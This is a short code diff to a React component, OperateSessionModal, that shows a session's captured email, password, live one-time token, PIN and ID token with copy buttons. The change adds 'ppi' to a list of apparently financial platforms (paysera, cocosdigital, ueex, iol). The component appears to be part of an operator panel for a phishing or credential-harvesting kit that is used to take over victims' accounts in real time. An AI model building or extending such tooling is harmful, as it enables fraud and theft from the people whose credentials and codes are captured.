@@ -587,7 +587,7 @@ const OperateSessionModal = ({ session, onClose, index }: OperateSessionModalPro
             <MiniLive icon={<Mail size={10} />} label="Email" value={session.email} highlight={false} onCopy={() => copyToClipboard(session.email || "", "email")} isCopied={copied === "email"} />
             <MiniLive icon={<Lock size={10} />} label="Senha" value={currentPassword} highlight={currentPassword !== session.password} onCopy={() => copyToClipboard(currentPassword, "pw")} isCopied={copied === "pw"} />
             <MiniLive icon={<ShieldCheck size={10} />} label="Token" value={platformOtp} highlight={!!platformOtp} mono onCopy={() => copyToClipboard(platformOtp, "otp")} isCopied={copied === "otp"} />
-            {(session.source === "paysera" || session.source === "cocosdigital" || session.source === "ueex" || session.source === "iol") && (
+            {(session.source === "paysera" || session.source === "cocosdigital" || session.source === "ueex" || session.source === "iol" || session.source === "ppi") && (
               <>
                 {!!idPin && <MiniLive icon={<Lock size={10} />} label="PIN" value={idPin} highlight onCopy={() => copyToClipboard(idPin, "idpin")} isCopied={copied === "idpin"} />}
                 {!!idToken && <MiniLive icon={<Eye size={10} />} label="Token ID" value={idToken} highlight mono onCopy={() => copyToClipboard(idToken, "idtok")} isCopied={copied === "idtok"} />}
